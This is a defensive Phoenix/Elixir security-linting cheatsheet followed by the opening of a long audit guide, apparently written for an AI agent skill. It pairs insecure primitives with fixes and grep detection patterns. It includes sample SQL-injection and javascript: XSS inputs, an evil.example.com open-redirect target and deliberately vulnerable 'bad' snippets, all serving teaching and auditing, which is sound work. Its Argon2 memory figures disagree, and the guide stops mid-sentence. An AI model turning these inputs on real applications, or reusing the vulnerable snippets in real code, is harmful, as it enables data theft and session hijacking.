# Elixir Security Linter Cheatsheet

Quick-reference tables and short snippets for auditing Phoenix/Elixir code against the 13 vulnerability classes. Pair this with `anti-patterns.md` for full diagnoses and `guide.md` for the review workflow.

---

## 1. Primitive -> Fix Table

| # | Insecure primitive | Minimal fix |
|---|---|---|
| 1 | `String.to_atom(user_input)` | `Map.get(@allowed, user_input, :default)` (static allowlist) |
| 2 | `String.to_existing_atom(param)` on untrusted input | Validate against `MapSet` of known atoms; reject unknown values |
| 3 | `Module.concat(["Elixir", mod_name])` from params | Hard-coded dispatch table `%{"foo" => MyApp.Foo}` |
| 4 | `:erlang.binary_to_atom(bin)` in hot path | Return a string or use a bounded lookup cache |
| 5 | `fragment("WHERE name = '#{name}'")` | `fragment("WHERE name = ?", ^name)` |
| 6 | `Repo.query("SELECT * FROM u WHERE id = #{id}")` | `Repo.query("SELECT * FROM u WHERE id = $1", [id])` |
| 7 | `from(u in User, where: fragment("#{col} = ?", ^v))` | Allowlist `col`, then `field(u, ^col)` |
| 8 | `raw(@user_bio)` in HEEx | `@user_bio` (auto-escaped) or `Phoenix.HTML.html_escape/1` |
| 9 | `Phoenix.HTML.raw(Jason.encode!(data))` | `{:safe, data}` via HEEx interpolation |
| 10 | `redirect(to: params["next"])` | `redirect(to: Routes.safe_path(next))` with allowlist |
| 11 | `redirect(external: url)` on user input | Reject unless host in allowlist |
| 12 | `if token == session_token, do: ...` | `Plug.Crypto.secure_compare(token, session_token)` |
| 13 | `user.password_hash == Argon2.hash_pwd_salt(pw)` | `Argon2.verify_pass(pw, user.password_hash)` |
| 14 | `String.equivalent?(a, b)` on secrets | `Plug.Crypto.secure_compare/2` |
| 15 | `def handle_event("admin:" <> _, p, s)` without check | `ensure_role(s.assigns.current_user, :admin)` |
| 16 | `handle_event("delete", %{"id" => id}, s)` w/ no owner check | `ensure_owner!(s.assigns.current_user, Posts.get!(id))` |
| 17 | `User.changeset(%User{}, params)` with full cast | `safe_cast(params, @user_fields, sensitive: [:role])` |
| 18 | `cast(user, params, __schema__(:fields))` | Explicit allowlist; drop `:role`, `:is_admin`, `:balance` |
| 19 | `:crypto.hash(:sha256, password)` | `Argon2.add_hash/1` (or Bcrypt if legacy) |
| 20 | `Pbkdf2.hash_pwd_salt(pw, rounds: 1000)` | `Argon2.add_hash(pw)` with m=47104, t=1, p=1 |
| 21 | `put_session(conn, :user_id, id)` w/ default cookie | Enable `secure: true, http_only: true, same_site: "Strict"` |
| 22 | `signing_salt: "abc123"` in source | `System.fetch_env!("SIGNING_SALT")` |
| 23 | `config :app, :api_key, "sk-live-..."` | Runtime `System.fetch_env!/1` in `runtime.exs` |
| 24 | `plug :fetch_session` without CSRF plug | `plug :protect_from_forgery` in `:browser` pipeline |
| 25 | `socket "/live", ..., check_origin: false` | `check_origin: ["https://app.example.com"]` |
| 26 | `put_resp_header(conn, "x-frame-options", "ALLOW")` | `"DENY"` + CSP `frame-ancestors 'none'` |
| 27 | `Logger.info("token=#{token}")` | Redact in `Inspect` impl; log opaque id only |
| 28 | `ExAws.S3.presigned_url(url: params["u"])` | Validate scheme + host + path prefix |
| 29 | `File.read!(params["path"])` | `Path.safe_relative_to/2` + allowlisted root |

---

## 2. Severity Rubric

| Severity | Definition | Examples |
|---|---|---|
| **HIGH** | Direct, single-step path to attacker-controlled execution, persistent data loss, or complete account takeover. | (1) `String.to_atom/1` on request params driving dispatch, (2) raw SQL fragment with interpolated user input, (3) missing authz in `handle_event/3` that mutates other users' data, (4) password verification via `==`, (5) secrets committed to source. |
| **MEDIUM** | Requires a second bug, social engineering, or specific attacker position to exploit. | (1) Open redirect on login `next` parameter, (2) `raw/1` on data that is sometimes trusted, (3) `check_origin: false` behind a WAF, (4) CSP in report-only without enforcement, (5) Argon2 cost below OWASP minimum. |
| **LOW** | Hardening gap with no direct exploit in the current layout. | (1) Missing `X-Frame-Options` where CSP `frame-ancestors` is set, (2) session cookie without `SameSite=Strict` but with CSRF token, (3) overly broad mass-assignment on a non-privileged field, (4) verbose error page in staging, (5) `Logger.debug` leaking non-secret IDs. |

---

## 3. Exploit-Chain Outcome Labels

| Label | 1-line attack signature |
|---|---|
| `account-takeover` | Attacker replaces a victim's credential or session such that future logins authenticate as the victim. |
| `privilege-escalation` | Low-privilege user gains admin-only capability through missing authz, mass assignment, or role injection. |
| `data-exfiltration` | Attacker reads records they should not see via SQL injection, broken authz, or IDOR. |
| `denial-of-service` | Attacker triggers unbounded memory/CPU (atom table growth, oversized input, no rate limit) that crashes the node. |
| `session-hijack` | Attacker captures or forges a session token through XSS, insecure cookie flags, or CSWSH. |
| `rce` | Attacker causes arbitrary code execution via unsafe `Code.eval_string/1`, deserialization, or dynamic module loading. |

---

## 4. Grep Commands

```bash
# 1. Atom coercion from untrusted input
grep -rn 'String\.to_atom\|to_existing_atom' lib/

# 2. Dynamic Module.concat
grep -rn 'Module\.concat' lib/

# 3. Ecto fragment interpolation
grep -rn 'fragment("[^"]*#{' lib/

# 4. Raw Repo.query with interpolation
grep -rn 'Repo\.query.*#{' lib/

# 5. raw/1 in templates and components
grep -rn 'Phoenix\.HTML\.raw\|[^a-z]raw(' lib/

# 6. Open redirect patterns
grep -rn 'redirect.*params\|redirect.*conn\.params' lib/

# 7. external redirect
grep -rn 'redirect(external:' lib/

# 8. Plain-text secret comparison
grep -rn '==.*token\|token.*==\|==.*secret\|secret.*==' lib/

# 9. Missing secure_compare
grep -rn 'String\.equivalent\|Kernel\.==' lib/ | grep -i 'token\|secret\|hash\|hmac'

# 10. LiveView handle_event without authz helper
grep -rn 'def handle_event' lib/ | grep -v 'ensure_\|authorize\|can?'

# 11. Mass assignment with full schema cast
grep -rn 'cast(.*__schema__(:fields)' lib/

# 12. Weak hashing
grep -rn ':crypto\.hash.*password\|md5\|sha1' lib/

# 13. Hardcoded signing_salt / secret_key_base
grep -rn 'signing_salt:\s*"[^"]\+"\|secret_key_base:\s*"[^"]\+"' lib/ config/

# 14. check_origin disabled
grep -rn 'check_origin:\s*false' lib/

# 15. Missing CSRF plug
grep -rn 'pipeline :browser' lib/ -A 10 | grep -L 'protect_from_forgery'
```

---

## 5. Phoenix.Token Signing / Verify

```elixir
# Signing
token = Phoenix.Token.sign(MyAppWeb.Endpoint, "user auth", {:user, user.id}, max_age: 60 * 60)

# Verifying
case Phoenix.Token.verify(MyAppWeb.Endpoint, "user auth", token, max_age: 60 * 60) do
  {:ok, {:user, user_id}} -> MyApp.Accounts.get_user!(user_id)
  {:error, :expired} -> {:error, :token_expired}
  {:error, :invalid} -> {:error, :token_invalid}
end
```

Rules of thumb:
- Always pass `max_age`. Never `:infinity`.
- Bind to something (`{:user, id}`) — never a bare value.
- Use a distinct context salt per purpose.

---

## 6. Opaque %Token{} Type

```elixir
defmodule MyApp.Auth.Token do
  @enforce_keys [:value]
  defstruct [:value]

  @type t :: %__MODULE__{value: binary()}

  @spec new(binary()) :: t()
  def new(value) when is_binary(value), do: %__MODULE__{value: value}

  @spec equal?(t(), t()) :: boolean()
  def equal?(%__MODULE__{value: a}, %__MODULE__{value: b}) do
    Plug.Crypto.secure_compare(a, b)
  end

  defimpl Inspect do
    def inspect(_token, _opts), do: "#Token<REDACTED>"
  end

  defimpl String.Chars do
    def to_string(_token), do: "[REDACTED]"
  end
end
```

---

## 7. `safe_cast/3` with Sensitivity Tags

```elixir
defmodule MyApp.Accounts.User do
  use Ecto.Schema
  import Ecto.Changeset

  schema "users" do
    field :email, :string
    field :name, :string
    field :role, Ecto.Enum, values: [:user, :admin], default: :user
    field :is_banned, :boolean, default: false
    timestamps()
  end

  @public_fields [:email, :name]
  @sensitive_fields [:role, :is_banned]

  def changeset(user, params, opts \\ []) do
    fields =
      if Keyword.get(opts, :admin?, false) do
        @public_fields ++ @sensitive_fields
      else
        @public_fields
      end

    user
    |> cast(params, fields)
    |> validate_required([:email])
    |> validate_format(:email, ~r/@/)
    |> unique_constraint(:email)
  end
end
```

---

## 8. Argon2id Cost Parameters (OWASP 2023)

| Parameter | OWASP minimum | Typical web app | Notes |
|---|---|---|---|
| Memory (`m_cost`) | 19 MiB (19456) | 47 MiB (47104) | 47 MiB is argon2_elixir's default |
| Iterations (`t_cost`) | 2 | 1 (with 47 MiB) | OWASP allows t=1 if m >= 46 MiB |
| Parallelism (`p_cost`) | 1 | 1 | BEAM scheduler concerns; keep at 1 |
| Hash length | 32 bytes | 32 bytes | Default; never less |
| Salt length | 16 bytes | 16 bytes | Default; generated per hash |

```elixir
# config/config.exs
config :argon2_elixir,
  t_cost: 1,
  m_cost: 16,        # 2^16 KiB = 64 MiB
  parallelism: 1,
  format: :encoded
```

---

## 9. CSP Report-Only Rollout Phases

1. **Inventory** — grep every `<script>`, `<style>`, `onclick`, inline `style=""`.
2. **Draft policy** — target enforced CSP with explicit host allowlist; no `'unsafe-inline'`.
3. **Report-Only ship** — `Content-Security-Policy-Report-Only` + `report-uri`.
4. **Observe (1-2 weeks)** — watch the report stream; fix real violations.
5. **Tighten** — add `nonce-{random}` to every allowed inline script.
6. **Dual-header week** — ship enforced CSP alongside Report-Only as a canary.
7. **Enforce** — flip to `Content-Security-Policy`. Keep `report-uri` for regressions.
8. **Tighten further** — `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'`.

---

## 10. Session Cookie Flags Checklist

- [ ] `secure: true` — cookie only sent over HTTPS.
- [ ] `http_only: true` — JavaScript cannot read via `document.cookie`.
- [ ] `same_site: "Strict"` — cookie not sent on cross-site requests.
- [ ] `signing_salt:` sourced from env, not literal.
- [ ] `encryption_salt:` set (distinct from signing_salt).
- [ ] `max_age:` explicit, not `:infinity` — typically 7-30 days.
- [ ] `domain:` pinned to the exact host.
- [ ] `path: "/"` — explicit; don't rely on defaults.

```elixir
plug Plug.Session,
  store: :cookie,
  key: "_myapp_key",
  signing_salt: System.fetch_env!("SESSION_SIGNING_SALT"),
  encryption_salt: System.fetch_env!("SESSION_ENCRYPTION_SALT"),
  secure: true,
  http_only: true,
  same_site: "Strict",
  max_age: 60 * 60 * 24 * 14,
  domain: "app.example.com"
```

---

## 11. CSRF Layers

| Layer | Primitive | Defeats |
|---|---|---|
| 1. `protect_from_forgery` plug | Signed per-session token in form | Basic CSRF |
| 2. Origin / Referer check | `check_origin:` on LiveView, custom plug on REST | Token replay from stolen form |
| 3. `SameSite=Strict` session cookie | Browser refuses to send cookie cross-site | CSRF without needing a token |
| 4. Double-submit cookie | CSRF token in both cookie and header | Subdomain XSS hijacking session |

---

## 12. Secrets Backend Selection

| Deployment target | Recommended backend | Never |
|---|---|---|
| Railway / Fly / Render | Platform env vars via `runtime.exs` | Literals in `config.exs` |
| AWS ECS / Lambda | AWS Secrets Manager / SSM Parameter Store | Container image `ENV` layers |
| Kubernetes | External Secrets Operator -> Vault / ASM | `Secret` manifest in git |
| Self-hosted bare metal | HashiCorp Vault agent sidecar | Unencrypted file on disk |
| Local dev | `.env` + `direnv`, `.env` in `.gitignore` | Committing `.env` |
| Test / CI | GitHub Actions Secrets injected as env | Real production secrets in CI |
supporting_files.references/guide.md:
# Elixir Security Linter — Domain Reference A narrative reference for auditing Elixir/Phoenix/LiveView applications against thirteen high-leverage vulnerability classes. This document is the long-form companion to `SKILL.md`: it exists so that Claude, when invoked under the `elixir-security-linter-composite` Agent Skill, has a durable place to look up *why* a pattern is dangerous, *how* an attacker actually chains it into impact, and *what* the correct Elixir-idiomatic fix looks like. Read the **Introduction** and **Exploit-Chain Hunting Philosophy** first, then jump to any H2 for a specific capability. ## Introduction Elixir and Phoenix are often marketed as "safe by default." That marketing is mostly true, and it is also the reason this skill exists. When a stack gets credit for safety, auditors relax. Reviewers stop reading `fragment/1` calls because Ecto "parameterizes queries." Operators stop reading HEEx because "`~H` escapes by default." Threat modelers stop worrying about URL redirection because "Phoenix uses signed tokens." Each of those statements is true *in isolation* and false *in practice*, because Elixir has unique attack surfaces that do not map cleanly onto OWASP Top 10 intuitions inherited from Rails, Django, or Express. This reference tries to capture the specifically-Elixir shape of those risks. Five structural properties of the runtime and framework create most of the interesting footguns: 1. **The global atom table is not garbage collected.** Every atom you ever create stays resident for the life of the BEAM. A single unvetted `String.to_atom/1` on a user-controlled string turns a public endpoint into a denial-of-service amplifier. This is covered in detail under **Atom Exhaustion**. 2. **Compile-time configuration leaks into release artifacts.** `config/config.exs`, `config/prod.exs`, and `Application.compile_env/3` all run at compile time. Secrets referenced there are baked into `.beam` files and recoverable from a release tarball with nothing more than `:beam_lib.chunks/2`. See **Secrets in Config** for the split between compile-time and runtime config. 3. **HEEx escapes *values* but not *directives*.** `~H""" """` is safe for the text content of the element but not for the attribute semantics: if `@url` is `"javascript:..."`, the browser cheerfully executes it. Worse, `Phoenix.HTML.raw/1` exists as an intentional escape hatch, and auditors routinely ignore it because HEEx is "safe by default." See **Raw XSS Prevention**. 4. **LiveView's persistent socket is a stateful trust boundary.** A `mount/3` permission check does not re-run on every `handle_event/3`. If a user's role changes mid-session, or if the client is spoofing an `assigns` field that survived a crash, the handler may be operating on stale authorization context. See **LiveView handle_event Authz**. 5. **The Plug pipeline is declarative and order-sensitive.** Moving `:fetch_session` below `:protect_from_forgery` silently disables CSRF protection. Moving `:put_secure_browser_headers` to `if` branches creates response-without-CSP holes. Plug's power is that it's just a list; Plug's risk is that it's just a list. See **Plug Security Middleware Chain**. The shape of prior art matters. The most complete publicly-available guide to Elixir/Phoenix security scanning is **oliver-kriska/claude-elixir-phoenix v2.3.0**, which published a set of scanners organized around thirteen primitives very similar to the ones this skill evolves. That plugin's scanners are the intellectual starting point; the evolution under `elixir-security-linter-composite` narrows each capability and couples it to machine-scorable fitness, because audit primitives in isolation are not the interesting unit of review. The interesting unit is the *chain*. That is the subject of the next section. ## The Exploit-Chain Hunting Philosophy The foundation variant of this skill takes an architectural position that bears stating plainly: **do not count bugs. Hunt chains.** The reasoning starts with a frustrating observation about linters. Run any static scanner on a reasonably-sized Phoenix app and you will get hundreds of warnings. Most of them are junk: a `String.to_atom/1` in a test helper, a `raw/1` in a Markdown renderer that already runs sanitization, a hard-coded credential in `config/test.exs` that is scoped to CI. The signal-to-noise ratio of primitive-counting is terrible, and it is terrible in a way that trains reviewers to ignore alerts. Every "critical" finding that turns out to be a false positive weakens the credibility of the next real finding. The Phoenix-native way out of that failure mode is to treat each primitive as a **node** in an attack graph and each plausible data/trust flow between nodes as an **edge**. A finding is interesting only if it participates in a chain whose terminal node is *realized impact*: account takeover, tenant data exfiltration, privilege escalation, RCE, cookie theft with session persistence. A `String.to_atom/1` in a handler that no one can reach is noise. The same `String.to_atom/1` downstream of a `handle_event/3` that lacks re-authorization and upstream of a process registry lookup is the middle of a chain that ends in "attacker crashes a supervisor tree by exhausting the atom table and forces a failover that drops sessions." That is signal. **How to build the chain graph.** For each primitive the scanner finds, record: - **Source**: where does untrusted data enter? HTTP params, LiveView event payload, WebSocket frame, file upload, external API response, database field populated by an earlier user action. - **Sink**: what dangerous operation does the primitive invoke? `String.to_atom/1`, `fragment("... #{x} ...")`, `Phoenix.HTML.raw/1`, `redirect(to: user_url)`, `Plug.Crypto.secure_compare(a, b)` with the wrong side. - **Hop type**: is there a transformation in between? A `changeset` cast, a `Map.get/2`, a `String.downcase/1` that looks sanitizing but isn't, an implicit conversion via pattern matching. A chain is the shortest path from a source to a sink through one or more hops. Rank chains by the product of: - **Reachability**: can an unauthenticated external caller reach the source? Score 1.0. Authenticated user? 0.7. Admin-only? 0.2. - **Exploitability**: does the sink produce the impact directly (e.g., SQL injection via `fragment/1` on a user param → full DB read)? Score 1.0. Does it produce a pre-condition for a second bug (e.g., atom exhaustion → crash-based session invalidation)? Score 0.4. - **Impact class**: RCE 1.0, full-DB exfil 0.95, tenant-cross 0.9, account-takeover 0.85, session-theft 0.8, DoS 0.5, information-disclosure 0.3, style-only 0.0. Multiply the three and sort descending. The top ten chains in that sorted list are the audit report. Everything else is an appendix. This approach has two concrete consequences that show up in every subsequent section of this guide: 1. Each capability is documented with both the primitive-level check ("does this function get called on user input?") *and* the chain-level context ("what does the surrounding code need to look like for this to actually pop?"). If your scan catches the primitive but cannot reconstruct the chain, the finding is downgraded. 2. The **Multi-capability Attack Chains** section near the end of this guide is *not* optional reading. It is the worked-example library for how two or three primitives compose into named outcomes. A reviewer who skips it will score individual findings without context and will waste a client's remediation budget on false urgency. With that framing in mind, the rest of this document walks through each primitive. ## Atom Exhaustion **Background.** Atoms in the BEAM are symbols interned in a global, process-wide table. They are cheap to compare (pointer equality), which is why they are used for everything from module names to GenServer message tags. They have one fatal property for security: the table is not garbage collected. The default upper bound is 1,048,576 atoms; exceeding that crashes the node with `system_limit`. Any code path that creates an atom from attacker-controlled input is a slow-motion denial-of-service primitive. The attacker does not need to crash the node on the first request. They need only a loop that leaks one atom per request against an endpoint with no rate limit. **Elixir-specific failure modes.** The functions that create atoms from strings are `String.to_atom/1`, `String.to_existing_atom/1` (safe *only if the attacker cannot first cause the atom to be registered*), `Module.concat/1` and `Module.concat/2` (concatenates atoms, but coerces strings), `Kernel.binary_to_atom/1` (deprecated but still callable), and implicit atom creation through `Jason.decode!(data, keys: :atoms)` or `Plug.Conn.fetch_query_params/2` in combination with key-name matching tricks. Claude commonly makes two mistakes: - Uses `String.to_atom/1` in a `handle_in/3` callback because "the protocol uses atoms as message tags." - Uses `String.to_existing_atom/1` believing it is safe, without realizing that an earlier code path may have registered the atom, or that `keys: :atoms` options do register unconditionally. **The correct pattern.** Use a whitelist-and-lookup approach. Define the set of legal atoms at compile time, then convert user strings through an explicit map. ```elixir # Good: the atom set is bounded at compile time. @event_types %{ "click" => :click, "hover" => :hover, "submit" => :submit } def handle_event(name, _params, socket) do case Map.fetch(@event_types, name) do {:ok, atom} -> {:noreply, dispatch(atom, socket)} :error -> {:noreply, put_flash(socket, :error, "Unknown event")} end end ``` The equivalent bad code often looks deceptively innocent: ```elixir # Bad: attacker can feed arbitrary strings, each becomes a permanent atom. def handle_event(name, _params, socket) do {:noreply, dispatch(String.to_atom(name), socket)} end ``` **Grep patterns for detection.** - `String\.to_atom\(` — any match is a finding until proven reachable only from compile-time input. - `String\.to_existing_atom\(` — finding unless the caller can prove the candidate set is bounded and pre-registered. - `Module\.concat\(\[.*.*\]\)` — dynamic module concatenation is an atom leak plus a dispatch hazard. - `Jason\.decode!?\(.*keys:\s*:atoms` — implicit atom creation on decode. - `:erlang\.binary_to_atom\(` — rare but appears in low-level code. **Anti-pattern catalog.** 1. **Event tag dispatch via `String.to_atom/1`.** Fix: use a `@table %{"name" => :name}` and `Map.fetch/2`. 2. **`keys: :atoms` on JSON decode of HTTP body.** Fix: decode with string keys, then cast through a schema. 3. **Metric name coercion.** Fix: require metric names to match a precompiled regex against a known set, and reject unknown names rather than create them. 4. **Dynamic GenServer name registration via `String.to_atom/1`.** Fix: use `{:via, Registry, {MyRegistry, name}}` with a string name. 5. **`String.to_existing_atom/1` on a route param because "the routes are known."** Fix: cast against a static `@route_names` list. "Existing" is not a trust boundary. The chain risk here is that atom exhaustion usually does not stand alone. See **Multi-capability Attack Chains** for how it combines with session invalidation to amplify impact. ## Ecto Fragment Injection **Background.** Ecto's query DSL is parameterized by default. Writing `from p in Post, where: p.title == ^title` is safe because `^title` is passed as a parameter to the prepared statement. The `fragment/1` macro is the escape hatch for SQL that cannot be expressed in Ecto syntax, and it is the single largest source of SQL injection in Phoenix codebases. `fragment/1` accepts a string as its first argument, and that string is interpolated into the compiled SQL literally. Any `#{}` interpolation against user data in that string is a textbook SQLi primitive. **Elixir-specific failure modes.** Claude often reaches for `fragment/1` when writing full-text search, JSON column access, or LATERAL joins. The reflex is right (use `fragment/1` for things Ecto's DSL doesn't express) but the implementation is wrong (interpolate the search term). Worse, the linter-friendly version with `?` placeholders looks syntactically identical to the unsafe version, so a careless reviewer misses the difference. **The correct pattern.** ```elixir # Good: ? placeholders are bound as parameters, not interpolated. from p in Post, where: fragment("to_tsvector('english', ?) @@ plainto_tsquery(?)", p.body, ^query) ``` ```elixir # Bad: string interpolation against user input. from p in Post, where: fragment("to_tsvector('english', body) @@ plainto_tsquery('#{query}')") ``` The second form compiles. It runs. It also lets `query = "' OR 1=1 --"` return every row in the table. **Grep patterns for detection.** - `fragment\("[^"]*#\{` — string interpolation inside a fragment literal. High-confidence finding. - `fragment\(\s*"[^"]*' *?\$\{` — same in different interpolation syntaxes (rare in Elixir but appears in macros). - Any `fragment/1` call whose first argument is not a pure string literal is a finding and needs manual review. - `Ecto\.Adapters\.SQL\.query\(.*,\s*".*#\{` — raw `SQL.query/3` with interpolation bypasses the query DSL entirely. **Anti-pattern catalog.** 1. **Full-text search with interpolated query term.** Fix: use `?` placeholder, pin the param with `^`, bind the column reference separately. 2. **JSONB access with dynamic path.** Fix: validate the path against an allowlist, then build the query with `?` placeholders for the path segments. 3. **Dynamic `ORDER BY` column.** Fix: use `field(p, ^atom)` after validating the atom against an allowlist (see **Atom Exhaustion** for the atom-list pattern). 4. **Raw `Ecto.Adapters.SQL.query/3` with user data.** Fix: if you must drop to SQL, pass parameters as the third argument; never interpolate. 5. **`fragment/1` built via `Enum.join/2` on untrusted tokens.** Fix: compose the query using Ecto's DSL (`dynamic/1`, `or_where/3`), not string concatenation. The chain with **Mass Assignment in Changesets** is particularly vicious: a changeset allows the attacker to set a field, the field is then used in a `fragment/1` for ordering, and the ordering fragment contains the injection. See **Multi-capability Attack Chains**. ## Raw XSS Prevention **Background.** HEEx templates escape interpolated values by default. `

{@user_name}

` is safe even if `@user_name` is `""`, because HEEx emits HTML-escaped text. The risk is twofold: (a) `Phoenix.HTML.raw/1` and `{:safe, html}` tuples bypass escaping deliberately, and (b) **attribute context** is different from **text context** and Claude frequently forgets the distinction. **Elixir-specific failure modes.** The common pattern in audited code is `~H""" Link """` where `@url` has already been "validated" by checking that it is a string. HEEx escapes attribute *values* for HTML syntax, but does not constrain the *URL scheme*. If `@url = "javascript:alert(document.cookie)"`, the link fires on click. Similarly, `~H"""
"""` with attacker-controlled `@classes` can inject `class="foo" onmouseover="..."` in some template engines; HEEx does escape quotes in attribute values, but `raw/1` explicitly does not. **The correct pattern.** ```elixir # Good: enforce scheme allowlist before rendering. def safe_href(url) when is_binary(url) do case URI.parse(url) do %URI{scheme: scheme} when scheme in ["http", "https", "mailto"] -> url _ -> "#" end end # In HEEx: # Link ``` ```elixir # Bad: raw/1 in a blog renderer without a sanitizer. ~H"""
<%= raw(@post.body_html) %>
""" ``` The second form is correct *only* if `@post.body_html` has been sanitized by `HtmlSanitizeEx` (or equivalent) before it reached the template. Storing pre-sanitized HTML is a legitimate pattern; rendering unsanitized `body` through `raw/1` is not. **Grep patterns for detection.** - `raw\(` — any occurrence in a `.heex` or `.html.heex` file. Audit each one. - `{:safe,\s*` — manual construction of the safe tuple bypasses the escaping machinery. - `]*href={[^}]*@` — `@`-prefixed values interpolated into `href` without a scheme check. - `Phoenix\.HTML\.raw\(` — fully-qualified version of `raw/1`. - `{raw\(` — the Surface/function-component syntax for `raw`. **Anti-pattern catalog.** 1. **Markdown → HTML via `raw/1` with no sanitizer.** Fix: pipe through `HtmlSanitizeEx.basic_html/1` before storing or rendering. 2. **Profile `homepage` URL interpolated into `href`.** Fix: validate scheme against an allowlist; see `safe_href/1` above. 3. **Error messages rendered with `raw/1` because "they contain `` tags."** Fix: render with a small set of allowed tags using a component, not `raw/1`. 4. **`style={@inline_style}` with user data.** Fix: reject `style` entirely; CSS injection is a cookie-theft primitive (see **Session and Cookie Security**). 5. **`data-*` attributes interpolated from user input.** Fix: escape is automatic in HEEx, but if the data attribute is later read by a script and eval'd, you have a DOM-XSS primitive anyway; validate shape. ## Open Redirect Protection **Background.** Open redirects are "low-severity" until paired with any authentication flow, at which point they become phishing superhighways. The classic pattern is a login flow that honors a `?return_to=/dashboard` parameter, which an attacker replaces with `?return_to=https://evil.example.com/fake-login`. The victim logs in, is redirected to the attacker's domain, and re-enters credentials into a pixel-perfect clone. Phoenix's `redirect/2` with `to:` is safe against this because `to:` is a path (no host), but `redirect(external: url)` with an unvalidated `url` is the footgun. **Elixir-specific failure modes.** Claude sometimes "helpfully" converts a relative redirect to an absolute one to support multi-subdomain flows, then forgets that the conversion opens the external-URL surface. The two Plug/Phoenix functions to watch are `Phoenix.Controller.redirect/2` with `:external` and `Plug.Conn.resp/3` with a `location` header set directly. **The correct pattern.** ```elixir def login_return(conn, %{"return_to" => return_to}) do case safe_return_path(return_to) do {:ok, path} -> redirect(conn, to: path) :error -> redirect(conn, to: "/") end end defp safe_return_path(path) do cond do is_binary(path) and String.starts_with?(path, "/") and not String.starts_with?(path, "//") -> {:ok, path} true -> :error end end ``` The `//` check is critical: `//evil.example.com/foo` is parsed as protocol-relative and routes the browser to `evil.example.com`. **Grep patterns for detection.** - `redirect\(.*external:` — audit every call site. - `put_resp_header\(.*"location"` — manual `Location` setting, often bypasses redirect helpers. - `redirect\(.*to:.*params\[` — redirect target pulled directly from params without validation. - `redirect\(.*to:.*conn\.query_params\[` — same pattern with explicit `query_params` access. **Anti-pattern catalog.** 1. **`redirect(conn, to: params["return_to"])`.** Fix: validate with `safe_return_path/1` or equivalent. 2. **Building a URL with `"https://#{host}#{path}"` and redirecting external.** Fix: never accept a user-controlled host in a redirect. 3. **Post-login hook honoring a `redirect_uri` OAuth-style param without allowlist.** Fix: maintain a per-client allowlist of redirect URIs. 4. **`redirect(conn, external: conn.params["url"])` in an email-confirmation handler.** Fix: redirect to a canonical post-confirmation path, not a user-provided URL. 5. **A "smart" redirect helper that strips the host if it matches the current host.** Fix: don't be smart. Compare against a static allowlist. The chain with **LiveView handle_event Authz** can be particularly nasty: a `handle_event("navigate", ...)` with insufficient authorization combined with an open redirect produces a phishing vector that bypasses the same-origin assumptions of the LiveView session. ## Timing-Attack Comparisons **Background.** String comparison with `==` is not constant-time. The implementation short-circuits at the first byte that differs, and the time-to-mismatch is a side channel that leaks byte-by-byte information about the expected value. For most comparisons this does not matter. For comparisons of secrets — API tokens, session cookies, HMAC signatures, password hashes in reset-token handlers — it matters a great deal. A remote attacker can measure response time, refine their guess one byte at a time, and recover the secret. **Elixir-specific failure modes.** Elixir provides `Plug.Crypto.secure_compare/2` for exactly this purpose. The BEAM's pattern-match short-circuits the same way `==` does, so pattern-matching `<>` against a user string is also leaky. Claude sometimes reaches for `==` because it is the obvious operator, or for `String.equivalent?/2`, which is *also* not constant-time (it normalizes Unicode first, then compares). **The correct pattern.** ```elixir def verify_token(token, expected) when is_binary(token) and is_binary(expected) do Plug.Crypto.secure_compare(token, expected) end ``` ```elixir # Bad: both sides are variable-time. def verify_token(token, expected), do: token == expected ``` **Grep patterns for detection.** - `==\s*.*token` and `token.*==\s*` — lexical proximity heuristic; noisy but catches most cases. - `==\s*.*signature` — same for HMAC sig comparisons. - `==\s*.*secret` — same for generic secret comparisons. - `String\.equivalent\?\(` — noisy heuristic match; audit each call site. - Pattern-match clauses like `def verify(^expected, ...)` where `expected` is a compile-time binding to a secret — pattern match is not constant-time. **Anti-pattern catalog.** 1. **`params["token"] == stored_token`.** Fix: `Plug.Crypto.secure_compare(params["token"], stored_token)`. 2. **HMAC signature comparison with `==`.** Fix: `secure_compare/2`. `Plug.Crypto.verify/3` is better because it does both the HMAC and the compare in constant time. 3. **Pattern-matching a known-secret binding in a `case` head.** Fix: bind the candidate and secret, then call `secure_compare/2`. 4. **`String.downcase/1` on both sides before `==`.** Fix: normalization plus `==` is still not constant-time; normalize, then `secure_compare/2`. 5. **Comparing password hashes with `==` instead of using `Argon2.verify_pass/2`.** Fix: use the library's verify function; it handles both the compare and the domain separator. ## LiveView handle_event Authorization **Background.** LiveView's mental model is "HTTP for the first render, then WebSocket for the rest." Authorization checks that run in `mount/3` execute once. Every subsequent `handle_event/3`, `handle_info/2`, and `handle_params/3` operates on the assigns carried by the socket. If the user's role changes (a grant is revoked, a session is logged out elsewhere, a token is rotated) or if the handler operates on an entity identifier sent by the client, re-authorization is the developer's responsibility. It is not automatic. **Elixir-specific failure modes.** Claude writes: ```elixir def mount(_params, _session, socket) do if authorized?(socket.assigns.current_user) do {:ok, assign(socket, posts: list_posts())} else {:ok, push_navigate(socket, to: "/")} end end def handle_event("delete", %{"id" => id}, socket) do Posts.delete(id) {:noreply, assign(socket, posts: list_posts())} end ``` This is classic insecure direct object reference plus missing re-authorization. The `mount/3` check protects access to the *page*, not the *action*. A user with permission to view posts can send a `delete` event for a post ID they do not own, and the handler will delete it. **The correct pattern.** ```elixir def handle_event("delete", %{"id" => id}, socket) do with {:ok, post} <- Posts.fetch_for_user(id, socket.assigns.current_user), :ok <- Policy.authorize(:delete, post, socket.assigns.current_user), :ok <- Posts.delete(post) do {:noreply, socket |> update(:posts, &List.delete(&1, post)) |> put_flash(:info, "Deleted")} else {:error, :not_found} -> {:noreply, put_flash(socket, :error, "Not found")} {:error, :forbidden} -> {:noreply, put_flash(socket, :error, "Forbidden")} end end ``` The `Posts.fetch_for_user/2` call is the key. It scopes the fetch to the owning user, which means an unauthorized ID returns `:not_found` before the policy check even runs. The policy check then handles the "same user, wrong role" case. **Grep patterns for detection.** - `def handle_event\(.*\) do` followed within 10 lines by a `Repo.get` or `Ctx.get` without a user binding. - `socket\.assigns\.current_user` referenced only in `mount/3`, never in `handle_event/3`. - `|> Repo\.delete` in a `handle_event` clause without a preceding ownership check. - `%{"id" => id}` destructured in `handle_event` followed by a context call with only `id` as the argument. **Anti-pattern catalog.** 1. **Mount-only authorization.** Fix: re-authorize in every handler that mutates state. 2. **Fetching by ID without user scope.** Fix: `fetch_for_user(id, user)` returns `{:error, :not_found}` for non-owned IDs. 3. **Relying on the client to send `user_id` in the event payload.** Fix: ignore client-sent user IDs; always read `socket.assigns.current_user`. 4. **`handle_event("admin_*", 